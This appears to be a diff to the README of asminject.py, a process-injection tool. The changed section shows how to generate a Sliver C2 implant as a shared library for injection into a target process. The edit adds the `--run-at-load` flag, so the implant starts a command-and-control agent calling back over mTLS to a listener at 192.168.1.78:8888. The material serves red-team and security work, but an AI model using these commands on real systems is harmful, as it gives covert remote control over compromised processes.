@@ -75,7 +75,7 @@ This payload requires relative offsets for the `ld` shared library used by the t
 
 Locate or build a `.so` file to open. The example below uses a [Sliver](https://github.com/BishopFox/sliver) C2 listener and implant.
 
-Note: in this example, the `--arch=386` option for the implant generation is specified because the corresponding `asminject.py` example below is using the `x86` architecture. For `x86-64`, you'd want to use `--arch=amd64`. For `arm32`, you could try using `--arch=arm`, but as of this writing Sliver doesn't seem to handle it well. I was going to include an example that used the `linux/armle/meterpreter/reverse_tcp` payload from Metasploit instead, but it seems that `elf-so` output for that payload isn't working at present.
+Note: in this example, the `--arch=386` option for the implant generation is specified because the corresponding `asminject.py` example below is using the `x86` architecture. For `x86-64`, you'd want to use `--arch=amd64`. For `arm32`, you could try using `--arch=arm`, but as of this writing Sliver doesn't seem to handle it well. Regardless of the other options, remember to include `--run-at-load` or the shared library won't launch the C2 agent when `asminject.py` injects it into the target process.
 
 ```
 # ./sliver-server     
@@ -103,10 +103,9 @@ All hackers gain infect
 ==== ====== ========== ======
  2    mtls   tcp        8888 
 
-[server] sliver > generate --mtls=192.168.1.78:8888 --os=linux --arch=386 --format=shared --save=/home/user --skip-symbols
+[server] sliver > generate --mtls=192.168.1.78:8888 --os=linux --arch=386 --format=shared --save=/home/user --run-at-load
 
 [*] Generating new linux/386 implant binary
-[!] Symbol obfuscation is disabled
 [*] Build completed in 00:01:48
 [*] Implant saved to /home/user/MAGENTA_NEEDLE.so
 ```
